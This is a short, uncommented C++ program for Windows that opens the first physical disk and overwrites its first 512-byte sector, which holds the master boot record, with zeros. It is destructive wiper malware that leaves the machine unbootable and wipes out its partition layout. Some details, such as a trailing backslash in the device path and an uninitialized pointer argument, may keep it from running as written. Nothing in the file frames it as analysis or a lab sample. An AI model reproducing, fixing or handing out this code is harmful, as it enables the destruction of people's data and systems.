#include <iostream>
#include <Windows.h>

using namespace std;

int main(void){
		char mbr[512];
		size_t Lenght = sizeof(mbr);
		
		ZeroMemory((PVOID)&mbr, Lenght);
		LPCSTR Pd0 = "\\\\.\\PhysicalDrive0\\";
		
		
		HANDLE MBR = CreateFileA(Pd0, GENERIC_EXECUTE | GENERIC_WRITE | GENERIC_READ, 0x00000001 | 0x00000002, 0, OPEN_EXISTING, 0, 0);
		if(MBR == INVALID_HANDLE_VALUE){
				GetLastError();
				return -1;
		}
		
		LPDWORD nullaf;
		
		BOOL Wfile = WriteFile(MBR, mbr, (DWORD)512, nullaf, 0);
		if(Wfile == 1){
				cout << "Done." <<endl;
				return 0;
		}
		else{
				cout << "Failed :" << GetLastError() << endl;
				return -1;
		}
		
		return EXIT_SUCCESS;
}
